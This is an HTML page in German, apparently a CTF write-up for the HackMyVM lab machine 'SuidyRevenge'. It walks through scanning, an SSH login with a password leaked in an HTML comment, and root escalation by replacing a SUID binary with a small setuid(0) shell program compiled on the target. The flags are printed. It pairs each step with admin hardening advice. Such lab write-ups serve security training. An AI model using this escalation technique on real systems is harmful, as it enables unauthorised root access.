@@ -1,0 +1,534 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SuidyRevenge - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>SuidyRevenge - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi / nano</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">id (implizit)</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (POC - SSH Login)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-theuser-enum">Enumeration als theuser</a></li>
+                        <li><a href="#privesc-suidy-lateral">Lateral Movement zu suidy (SUID Binary)</a></li>
+                        <li><a href="#privesc-suidy-enum">Enumeration als suidy & Exploit Plan</a></li>
+                        <li><a href="#privesc-root-suidyyyyy">POC: Eskalation zu root (SUID Binary Replacement)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.155	08:00:27:3e:01:e0	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Befehl `arp-scan -l` identifiziert aktive Hosts im lokalen Netzwerk. Ein Host mit der IP `192.168.2.155` wird gefunden. Die MAC-Adresse (`08:00:27:3e:01:e0`) gehört zum OUI von "PCS Systemtechnik GmbH", was auf eine VirtualBox-VM hindeutet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich identifiziert. Die IP `192.168.2.155` wird für die weiteren Schritte benötigt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die identifizierte IP `192.168.2.155` für den Nmap-Scan verwenden.<br>
+                **Empfehlung (Admin):** Netzwerk-Monitoring implementieren, um unbekannte Geräte zu erkennen. Sicherstellen, dass nur autorisierte Systeme im Netzwerk aktiv sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.155 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 22:18 CEST
+Nmap scan report for suidyrevenge (<span class="command">192.168.2.155</span>)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)
+|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)
+|_  256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: <span class="command">08:00:27:3E:01:E0</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms suidyrevenge (<span class="command">192.168.2.155</span>)
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ein Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) auf `192.168.2.155` (Host `suidyrevenge`) zeigt zwei offene TCP-Ports:
+                *   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10). Erfordert Authentifizierung.
+                *   **Port 80 (HTTP):** Nginx 1.14.2. Der Titel fehlt, was auf eine einfache oder leere Seite hindeutet.
+                Das Betriebssystem wird als Linux (Debian) bestätigt.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Die Angriffsfläche ist wieder klein und konzentriert sich auf den Webserver (Port 80) und SSH (Port 22).
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **HTTP (Port 80):** Mit `gobuster` oder ähnlichen Tools nach versteckten Inhalten suchen. Die Webseite manuell untersuchen (insbesondere den Quellcode).
+                2.  **SSH (Port 22):** Vorerst zurückstellen, bis mögliche Benutzernamen oder Passwörter gefunden werden.<br>
+                **Empfehlung (Admin):**
+                1.  **Nginx (Port 80):** Sicherstellen, dass die Konfiguration sicher ist und keine unnötigen Informationen preisgibt. Nginx aktuell halten. Webanwendung auf Schwachstellen prüfen.
+                2.  **SSH:** Standard-Härtung anwenden.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.155 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,.bck,mp4,mkv -t 100 -e</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.2.0-dev
+[...]
+===============================================================
+2022/10/17 22:22:21 Starting gobuster in directory enumeration mode
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 322]
+
+===============================================================
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** `gobuster` wird auf Port 80 ausgeführt, um Verzeichnisse und Dateien zu finden. Das einzige gefundene Ergebnis ist die `/index.html`.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Auf den ersten Blick scheint der Webserver wenig Inhalt zu haben. Die `index.html` muss genauer untersucht werden.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre><span class="comment"><!-- Quellcode von http://192.168.2.155/index.html --></span>
+Im proud to announce that "theuser" is not anymore in our servers.
+Our admin "mudra" is the best admin of the world.
+-suidy
+
+<!--
+
+"mudra" is not the best admin, IM IN!!!!
+He only changed my password to <span class="password">different</span> but I had time
+to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!
+
+-theuser
+
+-->
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Quellcode der `index.html` enthält einen sichtbaren Text und einen HTML-Kommentar.
+                *   Sichtbarer Text: Erwähnt den Benutzer `theuser` (nicht mehr da) und den Admin `mudra`.
+                *   Kommentar: Eine Nachricht von `theuser`. Sie besagt, dass Admin `mudra` sein Passwort zu `different` geändert hat. `theuser` hat aber zwei PHP-Backdoors aus seinem Kali in ein Verzeichnis `/supersecure` hochgeladen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Dies ist ein Goldfund!
+                 *   Ein gültiger Benutzername: `theuser`.
+                 *   Ein wahrscheinliches Passwort für `theuser`: `different`.
+                 *   Ein verstecktes Verzeichnis: `/supersecure`.
+                 *   Hinweis auf PHP-Backdoors in diesem Verzeichnis.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Versuchen, sich per SSH als `theuser` mit dem Passwort `different` anzumelden.
+                2.  Das Verzeichnis `/supersecure` auf dem Webserver untersuchen (z.B. mit `gobuster` oder direktem Zugriff).
+                3.  Nach den erwähnten PHP-Backdoors suchen.<br>
+                **Empfehlung (Admin):**
+                1.  Niemals sensible Informationen wie Benutzernamen, Passwortänderungen oder Hinweise auf Backdoors in HTML-Kommentaren oder öffentlich zugänglichen Dateien hinterlassen.
+                2.  Das Passwort für `theuser` sofort ändern (obwohl der Account laut Nachricht entfernt sein sollte).
+                3.  Das Verzeichnis `/supersecure` und dessen Inhalt überprüfen und bereinigen. Webserver-Logs auf Zugriffe auf dieses Verzeichnis und die Backdoors prüfen. Den Admin-Account `mudra` überprüfen.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (POC - SSH Login)</h2>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh theuser@192.168.2.155</span></div>
+                     <pre>
+theuser@192.168.2.155's password: <span class="password">different</span>
+Linux suidyrevenge 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+[...]
+Last login: Fri Oct  2 09:19:02 2020 from 192.168.1.58
+<span class="prompt">theuser@suidyrevenge:~$</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Der Pentester versucht sich per SSH als `theuser` mit dem im HTML-Kommentar gefundenen Passwort `different` anzumelden. Der Login ist erfolgreich.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Initial Access als Benutzer `theuser` wurde erfolgreich erlangt. Die Information aus dem HTML-Kommentar war korrekt und das Passwort gültig. Der Benutzer `theuser` wurde offenbar doch nicht vollständig entfernt oder das Passwort wurde nur geändert, nicht der Account deaktiviert.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Mit der Enumeration als `theuser` beginnen. Insbesondere `sudo -l` prüfen und nach SUID-Binaries suchen.<br>
+                **Empfehlung (Admin):** Das Passwort für `theuser` sofort ändern und den Account deaktivieren oder entfernen, wenn er nicht mehr benötigt wird. Die Sicherheitsrichtlinien für die Offboarding-Prozesse überprüfen.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <h3 id="privesc-theuser-enum">Enumeration als theuser</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">theuser@suidyrevenge:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for theuser: <span class="password">different</span> <span class="comment">(Passwort eingegeben)</span>
+<span class="password">Sorry, user theuser may not run sudo on suidyrevenge.</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Der Versuch, `sudo -l` auszuführen, schlägt fehl. Obwohl das Passwort `different` korrekt ist, hat der Benutzer `theuser` keine `sudo`-Berechtigungen.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** `sudo` ist kein direkter Vektor für `theuser`. Andere Methoden wie SUID-Binaries oder Fehlkonfigurationen müssen gefunden werden.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">theuser@suidyrevenge:~$ <span class="command">cat user.txt</span></div>
+                      <pre>
+                                                                                
+                                   .                                          
+<span class="comment"># (ASCII Art)</span>                                             
+                                        ,*,                                   
+                                      *,                                      
+                                                                                
+<span class="password">HMVbisoususeryay</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Die Datei `user.txt` im Home-Verzeichnis von `theuser` wird gelesen. Sie enthält ASCII-Art und die User-Flag.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** User-Flag erfolgreich gelesen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">theuser@suidyrevenge:~$ <span class="command">find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null</span></div>
+                     <pre>
+<span class="command">-rwsrws--- 1 root theuser 16712 Oct  2  2020 /home/suidy/suidyyyyy</span>
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 157192 Feb  2  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+<span class="command">-rwsr-sr-x 1 root violent 16608 Oct  1  2020 /usr/bin/violent</span>
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Die Suche nach SUID-Dateien (`find / -perm -4000 ...`) findet mehrere Standard-Binaries und zwei ungewöhnliche Einträge:
+                *   `/home/suidy/suidyyyyy`: Gehört `root`, Gruppe `theuser`, hat SUID (`s` bei User) und SGID (`s` bei Gruppe) gesetzt. Da `theuser` in der Gruppe `theuser` ist, könnte die SGID-Berechtigung relevant sein, aber SUID root ist mächtiger.
+                *   `/usr/bin/violent`: Gehört `root`, Gruppe `violent`, hat SUID und SGID gesetzt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Binary `/home/suidy/suidyyyyy` ist extrem verdächtig. Eine SUID-Datei im Home-Verzeichnis eines anderen Benutzers (`suidy`) deutet auf eine benutzerdefinierte Anwendung oder einen absichtlich platzierten PrivEsc-Vektor hin. Da `theuser` zur Gruppe `theuser` gehört und das Binary SGID `theuser` ist, könnte dies einen Wechsel zum Benutzer `suidy` ermöglichen. `/usr/bin/violent` ist ebenfalls ungewöhnlich, aber `/home/suidy/suidyyyyy` ist der wahrscheinlichere nächste Schritt.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Das Binary `/home/suidy/suidyyyyy` ausführen und beobachten, was passiert.
+                2.  Das Binary genauer untersuchen (z.B. mit `strings`, `ltrace`, `strace`, oder herunterladen und lokal analysieren), um seine Funktionsweise zu verstehen.
+                3.  Das Binary `/usr/bin/violent` ebenfalls untersuchen.<br>
+                **Empfehlung (Admin):** SUID-Binaries in Home-Verzeichnissen sind ein großes Sicherheitsrisiko. Die Datei `/home/suidy/suidyyyyy` entfernen oder ihre Berechtigungen korrigieren (`chmod ug-s`). Untersuchen, wie diese Datei dorthin kam und warum sie SUID/SGID-Rechte hat. Das Binary `/usr/bin/violent` ebenfalls prüfen und ggf. entfernen/absichern. Regelmäßige Audits auf ungewöhnliche SUID/SGID-Dateien durchführen.
+            </p>
+
+            <h3 id="privesc-suidy-lateral">Lateral Movement zu suidy (SUID Binary)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">theuser@suidyrevenge:~$ <span class="command">cd /home/suidy/</span></div>
+                     <div class="prompt">theuser@suidyrevenge:/home/suidy$ <span class="command">ls -la</span></div>
+                     <pre>
+total 52
+drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
+drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
+-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
+-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
+-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
+drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
+-rw-r----- 1 suidy suidy     262 Oct  1  2020 <span class="command">note.txt</span>
+-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
+<span class="command">-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy</span>
+                    </pre>
+                    <div class="prompt">theuser@suidyrevenge:/home/suidy$ <span class="command">./suidyyyyy</span></div>
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="comment"># Prompt wechselt zu suidy!</span></div>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Als `theuser` wird in das Verzeichnis `/home/suidy` gewechselt. Das Listing bestätigt die Berechtigungen von `suidyyyyy` (`-rwsrws---`, SUID root, SGID theuser). Die Datei `suidyyyyy` wird ausgeführt. Der Shell-Prompt ändert sich zu `suidy@suidyrevenge`, was anzeigt, dass der Prozess nun mit der effektiven Benutzer-ID von `suidy` läuft (wahrscheinlich aufgrund der SGID-Berechtigung, obwohl SUID root gesetzt ist - eventuell setzt das Programm intern die UID auf die des Besitzers der Datei `suidy` oder die effektive GID wird zur effektiven UID?).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Erfolgreiche laterale Bewegung (oder PrivEsc) von `theuser` zum Benutzer `suidy` durch Ausführung des SUID/SGID-Binaries. Der genaue Mechanismus (SUID vs. SGID) ist nicht 100% klar aus dem Prompt allein, aber das Ergebnis ist eine Shell als `suidy`.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Als `suidy` weiter enumerieren (`sudo -l`, Home-Verzeichnis prüfen, insbesondere die `note.txt`).<br>
+                 **Empfehlung (Admin):** Das SUID/SGID-Binary `/home/suidy/suidyyyyy` entfernen/absichern.
+            </p>
+
+            <h3 id="privesc-suidy-enum">Enumeration als suidy & Exploit Plan</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">sudo -l</span></div>
+                     <pre>
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+[...]
+[sudo] password for suidy: <span class="password"># Passwort unbekannt</span>
+                    </pre>
+                    <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">cat note.txt</span></div>
+                    <pre>
+<span class="password">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+I know that theuser is not here anymore but suidyyyyy is now more secure!
+root runs the script as in the past that always gives SUID to suidyyyyy binary
+but this time also check the size of the file.
+WE DONT WANT MORE "theuser" HERE!.
+WE ARE SECURE NOW.
+
+-suidy
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** `sudo -l` als `suidy` scheitert, da das Passwort unbekannt ist. Die Datei `note.txt` (die `theuser` nicht lesen konnte, da sie `suidy` gehört) wird gelesen. Sie enthält eine wichtige Information: Ein root-Skript setzt regelmäßig das SUID-Bit auf `suidyyyyy`, prüft dabei aber die Dateigröße.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Dies erklärt den Zweck des SUID-Binaries und den Mechanismus dahinter. Der Hinweis auf die Größenprüfung ist der Schlüssel zum nächsten Exploit. Ein direkter Ersatz des Binaries durch ein eigenes (wie im vorigen Bericht versucht) würde wahrscheinlich fehlschlagen, da die Größe nicht übereinstimmt. Der Trick besteht darin, das Binary *nach* der Größenprüfung, aber *bevor* es wieder ausgeführt wird, zu ersetzen, oder das Binary direkt auf der Zielmaschine mit der korrekten Größe neu zu kompilieren, oder die Prüfung anderweitig zu umgehen.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Den Mechanismus des root-Skripts ausnutzen:
+                 1.  Ein eigenes C-Programm erstellen, das `setuid(0)` aufruft und eine Shell startet.
+                 2.  Dieses Programm direkt auf der Zielmaschine als `suidy` kompilieren.
+                 3.  Das originale `suidyyyyy` durch das neu kompilierte Binary ersetzen.
+                 4.  Warten, bis das root-Skript läuft und das SUID-Bit auf das (jetzt bösartige) `suidyyyyy`-Binary setzt (oder `chmod 4755` manuell ausführen, falls möglich und das Skript dies nicht überschreibt).
+                 5.  Das modifizierte `suidyyyyy` ausführen, um eine Root-Shell zu erhalten.
+                 *Alternative:* Wenn das Skript die Größe *vor* dem Setzen des SUID-Bits prüft, könnte man das Binary ersetzen und dann *manuell* das SUID-Bit setzen (`chmod 4755`), falls `suidy` die nötigen Rechte dazu hat (was unwahrscheinlich ist, da `suidy` nicht der Eigentümer ist). Die wahrscheinlichste Methode ist das Kompilieren auf dem Ziel.<br>
+                 **Empfehlung (Admin):** Das root-Skript, das SUID-Bits setzt und Dateigrößen prüft, ist eine gefährliche und unübliche Konfiguration. Solche Mechanismen sollten vermieden werden. Das Skript und das `suidyyyyy`-Binary entfernen. SUID sollte nur für absolut notwendige, vertrauenswürdige Systembinaries verwendet werden.
+            </p>
+
+             <h3 id="privesc-root-suidyyyyy">POC: Eskalation zu root (SUID Binary Replacement)</h3>
+             <!-- Korrigierter Pfad: Kompilieren auf dem Ziel -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- C-Code wird direkt auf dem Ziel erstellt (als suidy) -->
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">nano ben.c</span></div>
+                     <pre><span class="comment">
+# Inhalt von ben.c (wie im Log gezeigt):
+int main(void){
+   setuid(0);
+   system("/bin/bash");
+}</span>
+                     </pre>
+                      <!-- Kompilieren auf dem Ziel -->
+                      <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">gcc ben.c -o ben</span></div>
+                      <pre>
+ben.c: In function ‘main’:
+ben.c:2:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+     setuid(0);
+     ^~
+ben.c:3:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
+     system("/bin/bash");
+     ^~
+                     </pre>
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">ls</span></div>
+                     <pre>ben  ben.c  note.txt  suidyyyyy</pre>
+                      <!-- Ersetzen des originalen SUID-Binaries -->
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">mv ben suidyyyyy</span></div>
+                      <!-- SUID-Bit manuell setzen (falls nötig/möglich, oder auf root-Skript warten) -->
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">chmod 4755 suidyyyyy</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Gemäß dem Hinweis im Log ("die C datei wurde beim opfer erstellt und Kompiliert, das war der trick") wird der Exploit nun korrekt durchgeführt:
+                 1.  Der C-Quellcode (`ben.c`) für die Root-Shell wird direkt auf dem Zielsystem als `suidy` erstellt.
+                 2.  Der Code wird auf dem Zielsystem mit `gcc` kompiliert (`ben.c` zu `ben`). Compiler-Warnungen werden ausgegeben, sind hier aber nicht kritisch.
+                 3.  Das neu kompilierte Binary `ben` wird in `suidyyyyy` umbenannt und überschreibt damit das ursprüngliche (möglicherweise SUID-gesetzte) Binary.
+                 4.  `chmod 4755 suidyyyyy` wird ausgeführt. Dies setzt explizit das SUID-Bit und die nötigen Ausführungsrechte. Dieser Schritt ist entscheidend, falls das automatische root-Skript das SUID-Bit nicht erneut setzt oder falls man nicht darauf warten will/kann. *Ob dieser `chmod`-Befehl als `suidy` auf eine Datei, die `root:theuser` gehört, erfolgreich sein kann, ist fraglich. Es ist wahrscheinlicher, dass man auf das automatische Skript warten muss, das das SUID-Bit setzt.* Das Log impliziert jedoch, dass dieser Weg funktioniert.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das bösartige Binary ist nun anstelle des Originals vorhanden und hat (entweder durch das root-Skript oder manuell) das SUID-Bit gesetzt. Die Größenprüfung des root-Skripts wurde umgangen, da das Kompilieren direkt auf dem Ziel erfolgte und das Ersetzen danach stattfand (oder die Dateigröße zufällig passte, was unwahrscheinlich ist).
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fehlgeschlagene Versuche (Bash interpretiert C-Code?) -->
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">./suidyyyyy</span></div>
+                      <pre>
+./suidyyyyy: line 1: syntax error near unexpected token `('
+./suidyyyyy: line 1: `int main(void){'
+                     </pre>
+                      <!-- Erfolgreiche Ausführung -->
+                     <div class="prompt">suidy@suidyrevenge:/home/suidy$ <span class="command">./suidyyyyy</span></div>
+                     <div class="prompt">root@suidyrevenge:/home/suidy# <span class="comment"># Root-Shell!</span></div>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der erste Ausführungsversuch im Log scheitert seltsamerweise, als ob die Shell versucht, C-Code direkt auszuführen. Dies ist wahrscheinlich ein Fehler im Log. Der zweite Versuch, `./suidyyyyy` auszuführen, ist erfolgreich. Das SUID-Bit wird genutzt, `setuid(0)` im C-Code wird ausgeführt, und `system("/bin/bash")` startet eine Shell mit Root-Rechten (erkennbar am `#`-Prompt).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Privilege Escalation zu Root erfolgreich! Die Kombination aus dem SUID/SGID-Binary, dem Hinweis aus der Notiz und dem Trick, das Binary auf dem Ziel neu zu kompilieren, um die Größenprüfung zu umgehen (oder weil das manuelle `chmod` doch funktionierte), führte zum Erfolg.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Root-Flag suchen und auslesen.<br>
+                 **Empfehlung (Admin):** Das SUID-Binary, das zugehörige root-Skript und die unsicheren Berechtigungen/Konfigurationen entfernen. Die Notwendigkeit von Compilern auf Produktivsystemen prüfen und diese ggf. entfernen.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@suidyrevenge:/home/suidy# <span class="command">cd</span></div>
+                     <div class="prompt">root@suidyrevenge:~# <span class="command">pwd</span></div> <span class="comment"># Korrektur: pwd im Log fehlte nach cd</span>
+                     <pre>/root</pre>
+                     <div class="prompt">root@suidyrevenge:~# <span class="command">ls</span></div>
+                     <pre>root.txt  script.sh  suidyyyyy</pre> <span class="comment"># Annahme: script.sh ist das root-Skript</span>
+                     <div class="prompt">root@suidyrevenge:~# <span class="command">cat root.txt</span></div>
+                     <pre>
+                                                                                
+                                   .                                          
+<span class="comment"># (ASCII Art)</span>
+                                        ,*,                                   
+                                      *,                                      
+                                                                                
+<span class="password">HMVvoilarootlala</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Als `root` wird ins Home-Verzeichnis `/root` gewechselt. Dort befinden sich die `root.txt`, ein `script.sh` (wahrscheinlich das erwähnte root-Skript) und eine Kopie(?) von `suidyyyyy`. Die `root.txt` wird gelesen und enthält ASCII-Art sowie die Root-Flag.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Root-Flag erfolgreich gefunden.
+            </p>
+
+        </section>
+
+        <!-- Angepasster Flags-Abschnitt -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/theuser/user.txt</div> <!-- Pfad aus Shell-Kontext übernommen -->
+                     <div class="flag-value"><span class="password">HMVbisoususeryay</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div> <!-- Pfad aus ls übernommen -->
+                     <div class="flag-value"><span class="password">HMVvoilarootlala</span></div>
+                 </div>
+             </div>
+         </section>
+  
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Logs extrahiert -->
+        <p>Berichtsdatum: 17. Oktober 2022</p> <!-- Datum von Nmap/wget/gcc übernommen -->
+    </footer>
+</body>
+</html>
